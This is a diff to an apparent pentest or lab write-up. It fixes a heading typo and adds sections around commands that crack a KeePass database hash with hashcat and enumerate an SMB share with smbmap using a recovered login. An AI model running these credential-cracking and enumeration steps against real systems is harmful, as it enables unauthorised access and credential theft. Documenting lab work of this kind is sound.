@@ -47,7 +47,8 @@ tree -h
 
 FOUND KEEPASS DATABASE 
 
-### CARCKING KEEPASS
+### CRACKING KEEPASS
+
 **CRACKING KEEPASS DATABASE FILE WITH HASHCAT**
 
 ```SHELL
@@ -65,6 +66,8 @@ sudo hashcat -m 13400 hash.txt rockyou.txt
 ```
 
 FOUND CREDENTIAL TO ACCESS AN SMB SHARE IN KEEPASS DATABASE 
+
+### SMB
 
 **ACCESSING SMB SHARE AND ENUMERATION ON SMB**
 
@@ -92,3 +95,8 @@ sudo smbmap -u 'finanace' -p 'password' -H <target-ip-OR-hostname>
 sudo smbmap -u 'finanace' -p 'password' -H <target-ip-OR-hostname> -r <sharename>
 ```
 
+**MOUNTING SMB SHARE ON LOCAL FILESYSTEM**
+
+```SHELL
+mou
+```
